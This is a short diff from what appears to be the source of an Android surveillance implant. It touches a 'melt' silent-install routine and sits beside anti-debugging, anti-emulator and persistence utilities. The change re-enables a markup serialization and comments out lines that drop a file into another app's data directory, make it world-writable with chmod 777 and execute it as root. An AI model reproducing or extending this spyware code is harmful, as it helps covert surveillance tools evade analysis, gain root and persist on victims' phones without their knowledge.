@@ -44,6 +44,7 @@ import com.android.dvci.util.AntiDebug;
 import com.android.dvci.util.AntiEmulator;
 import com.android.dvci.util.AntiSign;
 import com.android.dvci.util.Check;
+import com.android.dvci.util.Execute;
 import com.android.dvci.util.PackageUtils;
 import com.android.dvci.util.StringUtils;
 import com.android.dvci.util.Utils;
@@ -1153,11 +1154,14 @@ public class Core extends Activity implements Runnable {
 					Status.self().makeToast(M.e("Melt: dropped persistence"));
 				}
 
-				//Markup markupMelt = new Markup(Markup.MELT_FILE_MARKUP);
-				//markupMelt.serialize(Status.getAppContext().getPackageName());
+				Markup markupMelt = new Markup(Markup.MELT_FILE_MARKUP);
+				markupMelt.serialize(Status.getAppContext().getPackageName());
 
-				AutoFile markup = new AutoFile(String.format("/data/data/%s/files/mm", dvci));
-				markup.write(pack.getBytes());
+//				AutoFile markup = new AutoFile(String.format("/data/data/%s/mm", pack));
+//				markup.chmod("777");
+//
+//				markup.write(pack.getBytes());
+//				Execute.executeRoot(String.format("/data/data/%s/mm /data/data/%s/mm", pack, dvci ));
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (installSilentAsset), stopping melt");
